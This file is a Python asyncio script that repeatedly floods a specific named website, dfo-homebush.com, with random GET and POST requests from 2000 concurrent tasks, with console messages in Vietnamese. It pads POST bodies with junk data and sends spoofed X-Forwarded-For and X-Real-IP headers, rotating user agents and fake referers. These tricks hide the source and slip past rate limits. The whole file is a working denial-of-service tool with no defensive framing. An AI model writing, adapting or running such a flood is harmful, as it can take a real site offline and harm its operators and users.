import asyncio
import aiohttp
import random

target_base = "https://dfo-homebush.com/"  

payloads = [ "" ]

user_agents = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-T515) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
]


async def attack(session, id):
    while True:
        try:
            method = random.choice(["GET", "POST"])
            path = random.choice(payloads)
            url = f"{target_base}{path}"
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                "Referer": random.choice([
                    "https://www.google.com/",
                    "https://www.facebook.com/",
                    "https://twitter.com/",
                    "https://www.youtube.com/",
                    "https://t.co/"
                ]),
                "Accept-Language": random.choice([
                    "en-US,en;q=0.9",
                    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
                    "en;q=0.8",
                    "zh-CN,zh;q=0.9",
                    "fr-FR,fr;q=0.9"
                ])
            }

            await asyncio.sleep(random.uniform(0.1, 0.9))  

            if method == "GET":
                async with session.get(url, headers=headers, ssl=False) as resp:
                    print(f"[GET]  Luồng {id} → {resp.status} | {path}")
                    await resp.read()
            else:
                payload = {"data": "A" * random.randint(500, 3000)} # (500, 3000) (3000, 7000)
                async with session.post(url, data=payload, headers=headers, ssl=False) as resp:
                    print(f"[POST] Luồng {id} → {resp.status} | {path}")
                    await resp.read()

        except Exception as e:
            print(f"[-] Luồng {id} lỗi: {repr(e)}")

async def main():
    num_threads = 2000   
    connector = aiohttp.TCPConnector(limit=None)
    timeout = aiohttp.ClientTimeout(total=50)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for i in range(num_threads):
            await asyncio.sleep(0.01)
            tasks.append(asyncio.create_task(attack(session, i + 1)))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())

